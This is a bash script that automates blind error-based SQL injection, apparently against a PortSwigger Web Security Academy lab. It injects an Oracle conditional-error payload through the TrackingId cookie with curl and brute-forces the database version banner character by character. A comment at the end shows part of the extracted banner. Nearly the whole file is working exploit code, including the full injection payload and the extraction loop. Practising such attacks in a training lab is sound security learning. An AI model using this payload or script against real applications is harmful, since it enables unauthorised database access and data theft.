#!/bin/bash

version=""
count=0
special_chars=('.' '-' '%20')

# Print the array elements
echo "Special characters: ${special_chars[@]}"



tkid=z72fSvN5twt0mIil
session=S84igO9YDF8WtX6LfkmckloTDCWoxHdg
url=https://0abe00d3042b98738017ad2e00f700d1.web-security-academy.net/


for count in {69..73};do
	special_char=true
	lower=true
	capital=true
	digits=true

	for i in ${special_chars[@]};do
		echo "Trying $i for Placeholder $count  ::::: $version"
			payload="' and (select case when substr((select banner from v\$version where banner like 'Oracle%25'),$count,1)='$i' then to_char(1/0) else 'a' end from users where username='administrator') = 'a'--"
			if curl -s -b "TrackingId=$tkid$payload;session=$session" $url | grep -q -i 'internal server error' ; then
			echo "Placeholder $count is $i"
			version=$version$i
			special_char=false
			break
		
		fi
	done

	if $special_char ;then
		echo "Not in special Letters trying with digits"
		for i in {0..9};do
			echo "Trying $i for Placeholder $count ::::: $version"
			payload="' and (select case when substr((select banner from v\$version where banner like 'Oracle%25'),$count,1)='$i' then to_char(1/0) else 'a' end from users where username='administrator') = 'a'--"
			if curl -s -b "TrackingId=$tkid$payload;session=$session" $url | grep -q -i 'internal server error' ; then
				echo "Placeholder $count is $i"
				version=$version$i
				digits=false
				break
			
			fi
		done
	fi

	if $digits && $special_char ;then
		echo "Not in digits trying with lower case letters"
		for i in {a..z};do
			echo "Trying $i for Placeholder $count ::::: $version"
			payload="' and (select case when substr((select banner from v\$version where banner like 'Oracle%25'),$count,1)='$i' then to_char(1/0) else 'a' end from users where username='administrator') = 'a'--"
			if curl -s -b "TrackingId=$tkid$payload;session=$session" $url | grep -q -i 'internal server error' ; then
				echo "Placeholder $count is $i"
				version=$version$i
				lower=false
				break
			fi
		done
	fi
	if $lower && $special_char && $digits ;then
		echo "Not in lower Letters and special letters and digits trying with capital case letters"
		for i in {A..Z};do
			echo "Trying $i for Placeholder $count ::::: $version"
			payload="' and (select case when substr((select banner from v\$version where banner like 'Oracle%25'),$count,1)='$i' then to_char(1/0) else 'a' end from users where username='administrator') = 'a'--"
			if curl -s -b "TrackingId=$tkid$payload;session=$session" $url | grep -q -i 'internal server error' ; then
				echo "Placeholder $count is $i"
				version=$version$i
				capital=false
				break
				
			fi
		done
	fi



done
echo $version

#laceholder 68 is u Trying . for Placeholder 69  ::::: Oracle%20Database%2011g%20Express%20Edition%20Release%2011.2.0.2.0%20-%2064bit%20Produ
